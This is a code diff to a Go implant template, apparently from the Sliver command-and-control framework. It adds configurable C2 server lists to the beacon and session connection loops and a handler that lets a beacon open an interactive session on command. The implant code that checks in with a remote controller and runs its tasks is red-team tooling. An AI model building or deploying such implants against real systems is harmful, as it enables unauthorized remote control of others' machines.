@@ -65,11 +65,19 @@ import (
 	// {{end}}
 )
 
-// {{if .Config.IsBeacon}}
 var (
+	// {{if .Config.IsBeacon}}
 	BeaconID string
+	// {{end}}
+
+	c2Servers = []string{
+		// {{range $index, $value := .Config.C2}}
+		"{{$value}}", // {{$index}}
+		// {{end}}
+	}
 )
 
+// {{if .Config.IsBeacon}}
 func init() {
 	id, err := uuid.NewV4()
 	if err != nil {
@@ -90,7 +98,7 @@ func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, ch
 	for {
 		select {
 		default:
-			connection := transports.StartConnectionLoop()
+			connection := transports.StartConnectionLoop(c2Servers)
 			if connection == nil {
 				break
 			}
@@ -170,11 +178,16 @@ func main() {
 	// {{else}}
 
 	// {{if .Config.IsBeacon}}
+
 	// {{if .Config.Debug}}
 	log.Printf("Running in Beacon mode with ID: %s", BeaconID)
 	// {{end}}
-	for {
-		beacon := transports.NextBeacon()
+	abort := make(chan struct{})
+	defer func() {
+		abort <- struct{}{}
+	}()
+	beaconGenerator := transports.StartBeaconLoop(c2Servers, abort)
+	for beacon := range beaconGenerator {
 		// {{if .Config.Debug}}
 		log.Printf("Next beacon = %v", beacon)
 		// {{end}}
@@ -190,12 +203,14 @@ func main() {
 		// {{end}}
 		time.Sleep(reconnect)
 	}
+
 	// {{else}}
+
 	// {{if .Config.Debug}}
 	log.Printf("Running in session mode")
 	// {{end}}
 	for {
-		connection := transports.StartConnectionLoop()
+		connection := transports.StartConnectionLoop(c2Servers)
 		if connection != nil {
 			sessionMainLoop(connection)
 		}
@@ -231,13 +246,13 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 	// {{if .Config.Debug}}
 	log.Printf("Registering beacon with server")
 	// {{end}}
-	nextBeacon := time.Now().Add(beacon.Duration())
+	nextCheckin := time.Now().Add(beacon.Duration())
 	beacon.Send(Envelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
 		ID:          BeaconID,
 		Interval:    beacon.Interval(),
 		Jitter:      beacon.Jitter(),
 		Register:    RegisterSliver(),
-		NextCheckin: nextBeacon.UTC().Unix(),
+		NextCheckin: nextCheckin.UTC().Unix(),
 	}))
 	beacon.Close()
 	time.Sleep(time.Second)
@@ -251,9 +266,9 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 			break
 		}
 		duration := beacon.Duration()
-		nextBeacon = time.Now().Add(duration)
+		nextCheckin = time.Now().Add(duration)
 		go func() {
-			err := beaconMain(beacon, nextBeacon)
+			err := beaconMain(beacon, nextCheckin)
 			if err != nil {
 				intervalErrors++
 				// {{if .Config.Debug}}
@@ -263,7 +278,7 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		}()
 
 		// {{if .Config.Debug}}
-		log.Printf("[beacon] sleep until %v", nextBeacon)
+		log.Printf("[beacon] sleep until %v", nextCheckin)
 		// {{end}}
 		time.Sleep(duration)
 	}
@@ -331,7 +346,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 
 	for _, task := range tasks.Tasks {
 		// {{if .Config.Debug}}
-		log.Printf("[beacon] execute task %#v", task)
+		log.Printf("[beacon] execute task %d", task.Type)
 		// {{end}}
 		if handler, ok := sysHandlers[task.Type]; ok {
 			wg.Add(1)
@@ -352,16 +367,24 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 					Data: data,
 				})
 			})
+		} else if task.Type == sliverpb.MsgOpenSession {
+			go openSessionHandler(task.Data)
+			resultsMutex.Lock()
+			results = append(results, &sliverpb.Envelope{
+				ID:   task.ID,
+				Data: []byte{},
+			})
+			resultsMutex.Unlock()
 		} else if handler, ok := specHandlesr[task.Type]; ok {
 			wg.Add(1)
 			handler(task.Data, nil)
 		} else {
 			resultsMutex.Lock()
-			defer resultsMutex.Unlock()
 			results = append(results, &sliverpb.Envelope{
 				ID:                 task.ID,
 				UnknownMessageType: true,
 			})
+			resultsMutex.Unlock()
 		}
 	}
 	// {{if .Config.Debug}}
@@ -385,6 +408,37 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	log.Printf("[beacon] all results sent to server, cleanup ...")
 	// {{end}}
 	return nil
+}
+
+func openSessionHandler(data []byte) {
+	openSession := &sliverpb.OpenSession{}
+	err := proto.Unmarshal(data, openSession)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[beacon] failed to parse open session msg: %s", err)
+		// {{end}}
+	}
+	// {{if .Config.Debug}}
+	log.Printf("[beacon] open session -> %v", openSession.C2S)
+	// {{end}}
+	if openSession.Delay != 0 {
+		// {{if .Config.Debug}}
+		log.Printf("[beacon] delay %s", time.Duration(openSession.Delay))
+		// {{end}}
+		time.Sleep(time.Duration(openSession.Delay))
+	}
+
+	go func() {
+		connection := transports.StartConnectionLoop(openSession.C2S)
+		// {{if .Config.Debug}}
+		if connection == nil {
+			log.Printf("[beacon] failed to open session!")
+		}
+		// {{end}}
+		if connection != nil {
+			sessionMainLoop(connection)
+		}
+	}()
 }
 
 // {{end}} -IsBeacon
